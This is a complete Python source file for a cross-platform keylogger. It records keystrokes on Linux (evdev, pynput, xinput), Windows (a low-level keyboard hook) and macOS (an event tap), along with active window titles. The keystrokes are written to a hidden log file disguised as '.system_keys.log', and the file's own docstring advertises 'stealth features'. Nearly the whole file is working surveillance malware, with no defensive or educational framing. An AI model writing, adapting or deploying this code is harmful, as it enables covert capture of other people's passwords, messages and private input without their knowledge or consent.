#!/usr/bin/env python3
"""
KEYLOGGER - Cross-platform keystroke capture.
Supports: Linux (evdev, X11), Windows (hook), macOS (EventTap).
"""

import os
import sys
import json
import time
import threading
import platform
import subprocess
from typing import Dict, List, Any, Optional
from datetime import datetime
from pathlib import Path
import queue

class Keylogger:
    """Cross-platform keylogger with stealth features."""
    
    def __init__(self, output_file: str = None, buffer_size: int = 100):
        self.platform = platform.system().lower()
        self.output_file = output_file or str(Path.home() / ".cache" / ".system_keys.log")
        self.buffer_size = buffer_size
        self.running = False
        self.buffer = []
        self.key_queue = queue.Queue()
        
        # Key mappings
        self.special_keys = {
            " ": "[SPACE]",
            "\n": "[ENTER]",
            "\t": "[TAB]",
            "\b": "[BACKSPACE]",
            "\x1b": "[ESC]",
        }
        
        # Window tracking
        self.current_window = ""
        self.last_window_check = 0
        
        # Statistics
        self.stats = {
            "total_keys": 0,
            "start_time": None,
            "windows": {}
        }
        
        # Ensure output directory
        Path(self.output_file).parent.mkdir(parents=True, exist_ok=True)
    
    # ─── LINUX KEYLOGGER ───────────────────────────────────────────────
    
    def _linux_evdev_logger(self):
        """Linux keylogger using evdev (requires root or input group)."""
        try:
            import evdev
            from evdev import InputDevice, categorize, ecodes
            
            # Find keyboard devices
            devices = [InputDevice(path) for path in evdev.list_devices()]
            keyboards = [d for d in devices if any(x in d.name.lower() for x in ["keyboard", "key"])]
            
            if not keyboards:
                # Try all input devices
                keyboards = devices
            
            # Create non-blocking reads
            from select import select
            
            while self.running:
                r, w, x = select(keyboards, [], [], 0.5)
                
                for device in r:
                    try:
                        for event in device.read():
                            if event.type == ecodes.EV_KEY:
                                key_event = categorize(event)
                                
                                if key_event.keystate == 1:  # Key down
                                    key_name = key_event.keycode
                                    
                                    if isinstance(key_name, list):
                                        key_name = key_name[0]
                                    
                                    self._process_key(key_name, "evdev")
                    except:
                        pass
        
        except ImportError:
            # Fallback to X11
            self._linux_x11_logger()
    
    def _linux_x11_logger(self):
        """Linux keylogger using X11 (requires X display)."""
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    key_char = key.char
                except AttributeError:
                    key_char = f"[{key.name}]"
                
                self._process_key(key_char, "x11")
            
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            
            while self.running:
                time.sleep(0.1)
            
            listener.stop()
        
        except ImportError:
            # Fallback: xinput/xev
            self._linux_xinput_logger()
    
    def _linux_xinput_logger(self):
        """Linux keylogger using xinput (external tool)."""
        try:
            # Get keyboard device ID
            result = subprocess.run(
                ["xinput", "list", "--id-only", "keyboard"],
                capture_output=True, text=True
            )
            
            if result.returncode != 0:
                # Try to find any keyboard
                result = subprocess.run(
                    ["xinput", "list"],
                    capture_output=True, text=True
                )
                # Parse for keyboard ID - simplified
                return
            
            keyboard_id = result.stdout.strip().split()[0]
            
            # Monitor keyboard
            proc = subprocess.Popen(
                ["xinput", "test", keyboard_id],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True
            )
            
            while self.running:
                line = proc.stdout.readline()
                if "key press" in line:
                    key_code = line.split()[-1]
                    self._process_key(f"[KEY_{key_code}]", "xinput")
        
        except Exception as e:
            self._log_error(f"X11 logger error: {e}")
    
    # ─── WINDOWS KEYLOGGER ──────────────────────────────────────────────
    
    def _windows_hook_logger(self):
        """Windows keylogger using SetWindowsHookEx."""
        try:
            import ctypes
            from ctypes import wintypes
            import atexit
            
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            
            # Constants
            WH_KEYBOARD_LL = 13
            WM_KEYDOWN = 0x0100
            WM_SYSKEYDOWN = 0x0104
            
            # Low level keyboard hook callback type
            HOOKPROC = ctypes.CFUNCTYPE(
                ctypes.c_int,
                ctypes.c_int,
                ctypes.c_int,
                ctypes.POINTER(ctypes.c_ulong)
            )
            
            # Key mappings
            vk_codes = {
                0x08: "[BACKSPACE]", 0x09: "[TAB]", 0x0D: "[ENTER]",
                0x10: "[SHIFT]", 0x11: "[CTRL]", 0x12: "[ALT]",
                0x13: "[PAUSE]", 0x14: "[CAPS]", 0x1B: "[ESC]",
                0x20: "[SPACE]", 0x21: "[PGUP]", 0x22: "[PGDN]",
                0x23: "[END]", 0x24: "[HOME]", 0x25: "[LEFT]",
                0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]",
                0x2E: "[DEL]", 0x5B: "[WIN]", 0x5C: "[WIN]",
            }
            
            keys_pressed = set()
            
            def low_level_keyboard_handler(nCode, wParam, lParam):
                if nCode >= 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
                    vk_code = lParam.contents.value & 0xFF
                    
                    # Get key name
                    shift_pressed = 0x10 in keys_pressed
                    
                    if vk_code in vk_codes:
                        key_name = vk_codes[vk_code]
                    elif 0x41 <= vk_code <= 0x5A:  # A-Z
                        if shift_pressed:
                            key_name = chr(vk_code)  # Uppercase
                        else:
                            key_name = chr(vk_code + 32)  # Lowercase
                    elif 0x30 <= vk_code <= 0x39:  # 0-9
                        if shift_pressed:
                            shift_nums = ")!@#$%^&*("
                            key_name = shift_nums[vk_code - 0x30]
                        else:
                            key_name = chr(vk_code)
                    else:
                        key_name = f"[VK_{vk_code}]"
                    
                    self._process_key(key_name, "windows_hook")
                    keys_pressed.add(vk_code)
                
                return user32.CallNextHookEx(None, nCode, wParam, lParam)
            
            # Set hook
            hook_proc = HOOKPROC(low_level_keyboard_handler)
            hook = user32.SetWindowsHookExA(
                WH_KEYBOARD_LL,
                hook_proc,
                kernel32.GetModuleHandleW(None),
                0
            )
            
            if not hook:
                raise Exception("Failed to set hook")
            
            # Message loop
            msg = wintypes.MSG()
            while self.running:
                if user32.PeekMessageA(ctypes.byref(msg), None, 0, 0, 1):
                    user32.TranslateMessage(ctypes.byref(msg))
                    user32.DispatchMessageA(ctypes.byref(msg))
                else:
                    time.sleep(0.01)
            
            # Unhook
            user32.UnhookWindowsHookEx(hook)
        
        except Exception as e:
            self._log_error(f"Windows hook error: {e}")
            # Fallback to pynput
            self._windows_pynput_logger()
    
    def _windows_pynput_logger(self):
        """Windows keylogger using pynput (fallback)."""
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    key_char = key.char
                except AttributeError:
                    key_char = f"[{key.name}]"
                
                self._process_key(key_char, "pynput")
            
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            
            while self.running:
                time.sleep(0.1)
            
            listener.stop()
        
        except ImportError:
            self._log_error("pynput not available for Windows")
    
    # ─── MACOS KEYLOGGER ───────────────────────────────────────────────
    
    def _macos_logger(self):
        """macOS keylogger using EventTap (requires Accessibility permission)."""
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    key_char = key.char
                except AttributeError:
                    key_char = f"[{key.name}]"
                
                self._process_key(key_char, "macos")
            
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            
            while self.running:
                time.sleep(0.1)
            
            listener.stop()
        
        except ImportError:
            # Native CGEventTap
            self._macos_native_logger()
    
    def _macos_native_logger(self):
        """macOS keylogger using native CGEventTap."""
        try:
            import Quartz
            from Quartz import (
                CGEventTapCreate, kCGEventTapOptionListenOnly,
                kCGHIDEventTap, kCGEventKeyDown, kCGEventFlagMaskShift,
                CFRunLoopGetCurrent, CFRunLoopRun, CFRunLoopStop
            )
            
            def callback(proxy, event_type, event, refcon):
                if event_type == kCGEventKeyDown:
                    keycode = Quartz.CGEventGetIntegerValueField(
                        event, Quartz.kCGKeyboardEventKeycode
                    )
                    
                    flags = Quartz.CGEventGetFlags(event)
                    shift = bool(flags & kCGEventFlagMaskShift)
                    
                    # Keycode to character mapping
                    keymap = {
                        0x00: 'a', 0x0B: 'b', 0x08: 'c', 0x02: 'd', 0x0E: 'e',
                        0x03: 'f', 0x05: 'g', 0x04: 'h', 0x22: 'i', 0x26: 'j',
                        0x28: 'k', 0x25: 'l', 0x2E: 'm', 0x2D: 'n', 0x1F: 'o',
                        0x23: 'p', 0x0C: 'q', 0x0F: 'r', 0x01: 's', 0x11: 't',
                        0x20: 'u', 0x09: 'v', 0x0D: 'w', 0x07: 'x', 0x10: 'y',
                        0x06: 'z', 0x12: '1', 0x13: '2', 0x14: '3', 0x15: '4',
                        0x17: '5', 0x16: '6', 0x1A: '7', 0x1C: '8', 0x19: '9',
                        0x1D: '0', 0x24: '[ENTER]', 0x35: '[ESC]', 0x31: '[SPACE]',
                        0x30: '[TAB]', 0x33: '[DEL]', 0x35: '[ESC]',
                    }
                    
                    if keycode in keymap:
                        key = keymap[keycode]
                        if shift and len(key) == 1 and key.isalpha():
                            key = key.upper()
                        self._process_key(key, "macos_native")
                
                return event
            
            # Create event tap
            tap = CGEventTapCreate(
                kCGHIDEventTap, 0, kCGEventTapOptionListenOnly,
                1 << kCGEventKeyDown, callback, None
            )
            
            if not tap:
                raise Exception("Failed to create event tap - need Accessibility permission")
            
            # Run loop
            loop = CFRunLoopGetCurrent()
            
            while self.running:
                CFRunLoopRun()
                time.sleep(0.1)
            
            CFRunLoopStop(loop)
        
        except Exception as e:
            self._log_error(f"macOS logger error: {e}")
    
    # ─── COMMON FUNCTIONS ──────────────────────────────────────────────
    
    def _process_key(self, key: str, source: str = "unknown"):
        """Process captured keystroke."""
        self.stats["total_keys"] += 1
        
        # Get active window (throttled)
        if time.time() - self.last_window_check > 5:
            window = self._get_active_window()
            if window != self.current_window:
                self.current_window = window
                self._log_window_change(window)
            self.last_window_check = time.time()
        
        # Add to buffer
        self.buffer.append({
            "key": key,
            "window": self.current_window,
            "time": datetime.now().isoformat(),
            "source": source
        })
        
        # Flush buffer
        if len(self.buffer) >= self.buffer_size:
            self._flush_buffer()
    
    def _get_active_window(self) -> str:
        """Get currently active window title."""
        try:
            if self.platform == "linux":
                result = subprocess.run(
                    ["xdotool", "getwindowfocus", "getwindowname"],
                    capture_output=True, text=True, timeout=2
                )
                if result.returncode == 0:
                    return result.stdout.strip()[:100]
            
            elif self.platform == "windows":
                import ctypes
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd) + 1
                buffer = ctypes.create_unicode_buffer(length)
                ctypes.windll.user32.GetWindowTextW(hwnd, buffer, length)
                return buffer.value[:100]
            
            elif self.platform == "darwin":
                result = subprocess.run(
                    ["osascript", "-e", 'tell application "System Events" to get name of first process whose frontmost is true'],
                    capture_output=True, text=True, timeout=2
                )
                if result.returncode == 0:
                    return result.stdout.strip()[:100]
        
        except:
            pass
        
        return "unknown"
    
    def _log_window_change(self, window: str):
        """Log window change."""
        if window not in self.stats["windows"]:
            self.stats["windows"][window] = 0
        self.stats["windows"][window] += 1
        
        self._write_to_file(f"\n[WINDOW] {window}\n")
    
    def _flush_buffer(self):
        """Flush buffer to file."""
        if not self.buffer:
            return
        
        # Build log string
        log_str = ""
        for entry in self.buffer:
            log_str += entry["key"]
        
        self._write_to_file(log_str)
        self.buffer = []
    
    def _write_to_file(self, data: str):
        """Write data to log file."""
        try:
            with open(self.output_file, "a", encoding="utf-8") as f:
                f.write(data)
        except:
            pass
    
    def _log_error(self, msg: str):
        """Log error."""
        self._write_to_file(f"\n[ERROR] {msg}\n")
    
    # ─── CONTROL ───────────────────────────────────────────────────────
    
    def start(self):
        """Start keylogger."""
        if self.running:
            return
        
        self.running = True
        self.stats["start_time"] = datetime.now().isoformat()
        
        # Choose platform-specific logger
        if self.platform == "linux":
            self._thread = threading.Thread(target=self._linux_evdev_logger, daemon=True)
        elif self.platform == "windows":
            self._thread = threading.Thread(target=self._windows_hook_logger, daemon=True)
        elif self.platform == "darwin":
            self._thread = threading.Thread(target=self._macos_logger, daemon=True)
        else:
            raise Exception(f"Unsupported platform: {self.platform}")
        
        self._thread.start()
        print(f"[*] Keylogger started on {self.platform}")
        print(f"[*] Output: {self.output_file}")
    
    def stop(self):
        """Stop keylogger."""
        self.running = False
        self._flush_buffer()
        
        if hasattr(self, "_thread"):
            self._thread.join(timeout=2)
        
        print(f"[*] Keylogger stopped. Total keys: {self.stats['total_keys']}")
    
    def get_stats(self) -> Dict:
        """Get keylogger statistics."""
        return self.stats
    
    def get_log(self) -> str:
        """Get current log content."""
        try:
            with open(self.output_file, "r", encoding="utf-8") as f:
                return f.read()
        except:
            return ""
    
    def clear_log(self):
        """Clear log file."""
        try:
            with open(self.output_file, "w", encoding="utf-8") as f:
                f.write("")
        except:
            pass


# ─── CLI Entry Point ──────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    import signal
    
    parser = argparse.ArgumentParser(description="Keylogger")
    parser.add_argument("--output", "-o", help="Output file")
    parser.add_argument("--duration", "-d", type=int, help="Duration in seconds (0 = infinite)")
    parser.add_argument("--buffer", "-b", type=int, default=100, help="Buffer size")
    
    args = parser.parse_args()
    
    kl = Keylogger(args.output, args.buffer)
    
    def signal_handler(sig, frame):
        print("\n[*] Stopping...")
        kl.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    kl.start()
    
    if args.duration and args.duration > 0:
        time.sleep(args.duration)
        kl.stop()
    else:
        # Run until interrupted
        while True:
            time.sleep(1)
